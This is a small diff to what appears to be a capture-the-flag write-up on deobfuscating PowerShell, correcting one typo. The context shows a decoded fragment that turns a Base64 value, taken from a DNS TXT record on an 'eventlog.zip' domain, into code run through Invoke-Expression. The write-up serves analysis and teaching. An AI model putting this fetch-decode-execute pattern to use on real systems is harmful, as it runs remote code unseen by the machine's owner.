@@ -134,7 +134,7 @@ Deobfuscated:
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
 ```
 
-Now we can see that the variable "$5GMLW" is defined and invoked from Base64, which is geting the txt record from the "eventlog.zip" domain (at the time, this was the flag for the challenge)
+Now we can see that the variable "$5GMLW" is defined and invoked from Base64, which is getting the txt record from the "eventlog.zip" domain (at the time, this was the flag for the challenge)
 
 
 
